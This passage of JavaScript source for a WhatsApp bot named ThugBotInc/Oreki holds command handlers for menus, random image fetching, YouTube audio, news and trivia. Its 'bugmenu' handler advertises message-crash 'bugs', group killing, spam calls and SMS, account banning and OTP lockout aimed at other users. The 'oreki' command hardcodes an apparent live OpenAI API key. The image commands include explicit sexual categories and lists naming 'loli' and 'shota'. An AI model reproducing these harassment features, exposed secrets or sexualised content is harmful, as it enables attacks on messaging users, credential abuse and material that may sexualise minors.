                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;
case 'pterodactylmenu': case 'panelmenu': case 'panellist': case 'panel': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${pterodactylmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki19.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;    
case 'nsfwmenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${nsfwmenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki20.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break;  


case "bugmenu": case "bug": {
    await loading2();

    // Function to generate image messages
    const generateImageMessage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, { upload: ThugBotInc.waUploadToServer });
        return imageMessage;
    };

    // Prepare common variables
    const messageBody = `> 𝚄𝚂𝙴 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙸𝙱𝙻𝚈, 𝚃𝙷𝚄𝙶𝙱𝙾𝚃𝙸𝙽𝙲 𝚆𝙾𝚄𝙻𝙳 𝙽𝙾𝚃 𝙱𝙴 𝙷𝙴𝙻𝙳 𝙰𝙲𝙲𝙾𝚄𝙽𝚃𝙰𝙱𝙻𝙴 𝙵𝙾𝚁 𝙰𝙽𝚈 𝙼𝙸𝚂𝚄𝚂𝙴, 𝙱𝙴 𝚆𝙰𝚁𝙽𝙴𝙳`;

    const channelUrl = "https://whatsapp.com/channel/0029VaoOiuwDp2QH070eTE01";  // Assuming this is the channel URL.

    // Cards configuration
    const cardConfig = [
        {
            imagePath: './T-Media/Oreki23.jpg',
            bodyText: `*༺ 🂱 𝙳𝙸𝚁𝙴𝙲𝚃 𝙳𝙼 𝙱𝚄𝙶𝚂 🂱 ༻*\n*𝙷𝙴𝚈*\n*𝙱𝚈𝙴*\n*𝙷𝙸*\n*𝙱𝙸𝚃𝙲𝙷*\n*𝙷𝙴𝙻𝙻𝙾*`,
        },
        {
            imagePath: './T-Media/Oreki24.jpg',
            bodyText: `*༺ 🂱 𝙶𝚁𝙾𝚄𝙿 𝙱𝚄𝙶𝚂 🂱 ༻*\n*𝙺𝙸𝙻𝙻𝙶𝙲*\n*𝚇𝙶𝙲*\n*𝙲𝚁𝙰𝚂𝙷*`,
        },
        {
            imagePath: './T-Media/Oreki25.jpg',
            bodyText: `*༺ 🂱 𝚆𝙰𝚁 🂱 ༻*\n*𝙱𝙰𝙽*\n*𝚂𝙿𝙰𝙼-𝙲𝙰𝙻𝙻*\n*𝚂𝙿𝙰𝙼-𝚂𝙼𝚂*\n*𝙻𝙾𝙲𝙺𝙾𝚃𝙿*\n*𝚂𝙼𝙰𝙿𝚅𝙸𝙳*\n*𝚂𝙿𝙰𝙼-𝙿𝙰𝙸𝚁*\n*𝙰𝙽𝚃𝙸𝙱𝙻𝙾𝙲𝙺*\n*𝙲𝚁𝙰𝚂𝙷-𝚆𝙴𝙱*`,
        },
        {
            imagePath: './T-Media/Oreki26.jpg',
            bodyText: `*༺ 🂱 𝚅𝙸𝙿 𝙱𝚄𝙶𝚂 🂱 ༻*\n*𝙲𝚁𝙰𝚂𝙷-𝙸𝙼𝙼𝙽*\n*𝙾𝙼𝙴𝙶𝙰*\n*𝙱𝙴𝚃𝙰-𝙲𝚁𝙰𝚂𝙷*\n*𝚇-𝙸𝙾𝚂*`,
        }            
    ];

    // Generate cards with image messages
    const cards = await Promise.all(cardConfig.map(async (config) => {
        const imageMessage = await generateImageMessage(config.imagePath);
        return {
            header: { imageMessage, hasMediaAttachment: true },
            body: { text: config.bodyText },
            nativeFlowMessage: {
                buttons: [{
                    buttonText: { displayText: "Channel 🙊" },
                    urlButton: { url: channelUrl }
                }]
            }
        };
    }));

    // Prepare the interactive message content
    const msgContent = {
        interactiveMessage: {
            body: { text: messageBody },
            carouselMessage: { cards, messageVersion: 1 },
        }
    };

    // Generate and send the message
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: { message: msgContent }
    }, {});

    await ThugBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });

    break;
}

case 'othermenu': {
let xmenu_oh = `𝕾𝖆𝖑𝖚𝖙𝖆𝖙𝖎𝖔𝖓𝖘 👋 ${pushname}\n${readmore}\n\n${othermenu(prefix, hituet)}`
await ThugBotInc.sendMessage(m.chat, {
            document: {
                url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
            },
            caption: xmenu_oh,
            mimetype: 'application/zip',
            fileName: ownername,
            fileLength: "99999999999",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync('./T-Media/Oreki21.jpg'),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fstatus 
        });
    }
    break; 

case 'repo':
case 'botrepo':
case 'file':
case 'script':
case 'sc': {
                let pinga = `*Hey 👋 ${pushname}, kindly support my project. 🌼*\nhttps://github.com/DEMONST3R-CODER/Oreki_V2`
                ThugBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/9KdJyMs.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fstatus
                })
                break
                }

case 'channel': case 'support': {

    let pinga = `*Hey 👋 ${pushname}, follow my channel for latest updates and perks 😉🌼*\nhttps://whatsapp.com/channel/0029VaoOiuwDp2QH070eTE01`
                ThugBotInc.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/01OpoHh.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fstatus
                })
                break
                }



        case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await loading()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
ThugBotInc.sendMessage(m.chat, { image: { url: yeha }, caption : '*Here You Go!*' }, { quoted: m })
}
break 
case 'getpp': case 'getuserpp':
    if (!m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return reply(`*Reply to a user's message with ${prefix + command} to the fetch profile picture*`);
    }

    try {
        // If the command is used in reply to someone's message
        let targetUser = m.quoted ? m.quoted.sender : m.mentionedJid[0];
        let profilePicUrl = await ThugBotInc.profilePictureUrl(targetUser, 'image');
        let responseMessage = `Profile picture of @${targetUser.split('@')[0]}`;
        await ThugBotInc.sendMessage(m.chat, { image: { url: profilePicUrl }, caption: responseMessage, mentions: [targetUser] });
    } catch (error) {
        reply("*Couldn't fetch profile picture. The user might not have a profile picture or an error occurred.*");
    }
    break;
    case 'getppgc': {
if (!m.isGroup) return (`For Group Only`) 
try {
avatar = await ThugBotInc.profilePictureUrl(m.chat, "image")
} catch {
avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
ThugBotInc.sendMessage(m.chat, {image: {url: avatar }, caption: ` 🅿︎🄾𝚠𝕖𝚛𝕖𝐝 𝐁ʏ T𝗵Ⓤ𝖌🅝︎Ⓘ︎🄵🅸︎ᥴe͟n⃠𝚝 𝕋𝐞ᶜʜ™` }, {quoted: m })
}
case 'ytmp3': case 'youtubeaudio': case 'ytaudio': {
  if (!text) {
    return reply(`*Example: ${prefix + command} <YouTube link>*`);
  }
  
  if (!text.includes('youtube.com') && !text.includes('youtu.be')) {
    return reply('*Invalid YouTube link!*');
  }

  try {
    await loading(); // Display loading message

    // Construct API URL
    const ApiUrl = `https://api.ahmmikun.live/api/downloader/ytdl?url=${text}`;

    // Fetch YouTube audio data
    const response = await fetch(ApiUrl);
    const result = await response.json();

    if (!result || !result.music_info || !result.music_info.url) {
      return reply('*Failed to retrieve audio. Please check the link or try again later.*');
    }

    const audioUrl = result.music_info.url;
    const author = result.author || { nickname: 'Unknown' };
    const stats = result.stats || { likes: '0', comment: '0' };
    const title = result.title || 'Untitled';
    const cover = result.cover || '';

    // Send audio with context info
    await ThugBotInc.sendMessage(m.chat, {
      audio: { url: audioUrl },
      mimetype: 'audio/mpeg',
      contextInfo: {
        externalAdReply: {
          title: 'YouTube • ' + author.nickname,
          body: `${stats.likes} likes, ${stats.comment} comments. ${title}`,
          previewType: 'PHOTO',
          thumbnailUrl: cover,
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: text
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error processing YouTube audio:', error);
    reply('*An error occurred while processing your request. Please try again later.*');
  }
  break;
}
case 'bingnews': {
    try {
        // React with loading emoji
        await ThugBotInc.sendMessage(m.chat, { react: { text: `⏳`, key: m?.key } });

        // Fetch news data
        const response = await axios.get('https://api.ahmmikun.live/api/news/bingnews');

        const { success, data } = response.data;

        // Check if the response is valid
        if (success && data && Array.isArray(data)) {
            let newsMessage = `📰 *Bing News* 📰:\n\n`;

            // Loop through the first 5 articles to create the news message
            data.slice(0, 5).forEach((article, index) => {
                newsMessage += `*${index + 1}. ${article.title}*\n`;
                newsMessage += `🔗 [Read More](${article.url})\n`;
                newsMessage += `🖊️ Source: ${article.source}\n\n`;
            });

            // Send the news message
            await ThugBotInc.sendMessage(m.chat, { text: newsMessage }, { quoted: m });

            // React with success emoji
            await ThugBotInc.sendMessage(m.chat, { react: { text: `✅`, key: m?.key } });
        } else {
            reply(`*Unable to fetch news at the moment. Please try again later.*`);
        }
    } catch (error) {
        console.error("Error fetching news:", error);
        reply(`*An error occurred while fetching the news. Please try again later.*`);
    }
    break;
}
case 'everyone': 
        if (!isAdmins && !ThugTheCreator) return reply(mess.admin)
 ThugBotInc.sendMessage(m.chat, {
text: "@" + m.chat,
contextInfo: {
mentionedJid: (await (await ThugBotInc.groupMetadata(m.chat)).participants).map(a => a.id),
groupMentions: [
{
groupJid: m.chat,
groupSubject: 'everyone' 
}
]
}
}
)
   setTimeout(async () => {
           reply(`*${pushname} using ${command} to call you guys*`)
            }, 1120)
        break
        case 'buypremium':
            case 'premiumuser': {
            await loading()
                let teks = `*Hi ${pushname}👋*\n*Want to Buy Premium?*\n*Just chat with the owner on telegram 😉*\nt.me/Thugn1f1cent`
                await ThugBotInc.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.imgur.com/b0uzFw7.jpeg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
                    
case 'genshin':
    case 'swimsuit':
    case 'schoolswimsuit':
    case 'white':
    case 'barefoot':
    case 'touhou':
    case 'gamecg':
    case 'hololive':
    case 'uncensored':
    case 'sungglasses':
    case 'glasses':
    case 'weapon':
    case 'shirtlift':
    case 'chain':
    case 'fingering':
    case 'flatchest':
    case 'torncloth':
    case 'bondage':
    case 'demon':
    case 'pantypull':
    case 'headdress':
    case 'headphone':
    case 'anusview':
    case 'shorts':
    case 'stokings':
    case 'topless':
    case 'beach':
    case 'bunnygirl':
    case 'bunnyear':
    case 'vampire':
    case 'nobra':
    case 'bikini':
    case 'whitehair':
    case 'blonde':
    case 'pinkhair':
    case 'bed':
    case 'ponytail':
    case 'nude':
    case 'dress':
    case 'underwear':
    case 'foxgirl':
    case 'uniform':
    case 'skirt':
    case 'breast':
    case 'twintail':
    case 'spreadpussy':
    case 'seethrough':
    case 'breasthold':
    case 'fateseries':
    case 'spreadlegs':
    case 'openshirt':
    case 'headband':
    case 'nipples':
    case 'erectnipples':
    case 'greenhair':
    case 'wolfgirl':
    case 'catgirl':
    await loading()
  let res = await fetch(`https://fantox-apis.vercel.app/${command}`)
  if (!res.ok) throw await res.text()
  let jsonx = await res.json()
  if (!jsonx.url) throw '*Error*'
  ThugBotInc.sendFile(m.chat, jsonx.url, 'img.jpg', `*Here you go! 🌚*`, m)
  break    
case 'hobbycheck': 
case 'checkhobby': {
    const hobby = text;
    const hob = [
        '🍳 Cooking', '👴 Helping Grandpa', '🎮 Gaming', '🎬 Watching Movies', 
        '📱Social Media', '🤝 Helping Others', '📺 Watching Anime', '💃 Dancing', 
        '📷 Taking Unclear Photos', '🏍️ Riding a Motorcycle', '🎤 Singing', '🎨 Drawing', 
        '🎭 Acting', '🎻 Playing Violin', '🏄 Surfing', '🥋 Martial Arts', '🐝 Beekeeping', 
        '🤿 Scuba Diving', '✍️ Writing Stories', '📖 Reading Books', '🚴 Cycling', 
        '🎣 Fishing', '🏕️ Camping', '✈️ Traveling', '🎸 Playing Guitar', '🧘 Doing Yoga', 
        '🗿 Meditating', '⛰️ Hiking', '🏊 Swimming', '🛹 Skateboarding', '🪴 Gardening', 
        '🎧 Listening to Music', '🗺️ Exploring New Places', '📬 Collecting Stamps', 
        '🧩 Solving Puzzles', '👨‍🍳 Baking', '🎭 Cosplaying', '🧶 Crafting', '🎩 Doing Magic Tricks', 
        '📺 Watching Documentaries', '♟️ Chess', '❤️ Volunteering', '🦜 Bird Watching', 
        '✒️ Calligraphy', '🏹 Archery', '💰 Collecting Coins', '🎯 Tattoo Designing', 
        '🪵 Woodworking', '🌌 Stargazing', '🔮 Astrology', '🤺 Fencing', '🛶 Kayaking', 
        '🕯️ Candle Making', '🍹 Mixology', '🎧 DJ-ing', '😂 Stand-up Comedy', '🕺 Breakdancing', 
        '🎬 Vlogging', '🎙️ Podcasting', '👟 Sneaker Collecting', '🔭 Astronomy', 
        '🎲 Board Games', '🧩 Speed Cubing', '🏙️ Urban Exploring', '🗿 Sculpting', 
        '🦅 Falconry', '🖋️ Tattoo Collecting', '🏂 Snowboarding', '⛸️ Ice Skating', 
        '🤟 Learning Sign Language'
    ];
    
    const by = hob[Math.floor(Math.random() * hob.length)];
    
    ThugBotInc.sendMessage(frommeky, { 
        text: `*Hobby: ${by}*` 
    }, { quoted: m });
    break;
}
case 'oreki': {
    if (!text) return reply(`*ERROR!! EXAMPLE:*\n*${prefix + command} Hello, how are you?*`);

    // Show the loading message while the API request is being processed
    await loading();  // Assuming loading is defined elsewhere

    try {
        // Send thinking message
        reply('*Thinking...*');

        // Fetch response from OpenAI API
        const response = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Authorization': `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`,  // Replace with your actual API key
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                model: "gpt-3.5-turbo",
                messages: [{ role: "user", content: text }],
                max_tokens: 100
            })
        });

        // Parse the response
        const data = await response.json();

        // Check if the response contains choices
        if (!data.choices || data.choices.length === 0) {
            return reply('*Error: No response from AI. Try again later.*');
        }

        // Send the AI response
        reply(data.choices[0].message.content);
    } catch (e) {
        // Handle errors gracefully
        reply(`*An error occurred while processing your request:*\n${e.message}`);
    }

    break;
}

case 'fact':
case 'facts':
    await loading()
    const facts = [
        "Honey never spoils. 🍯",
        "A day on Venus is longer than a year on Venus. 🌍♀️",
        "Identical twins don’t have the same fingerprints. 👯‍♂️🖐️",
        "Earth’s rotation is changing speed. 🌍🕰️",
        "The largest piece of fossilized dinosaur poo discovered is over 30cm long and over two liters in volume. 🦖💩",
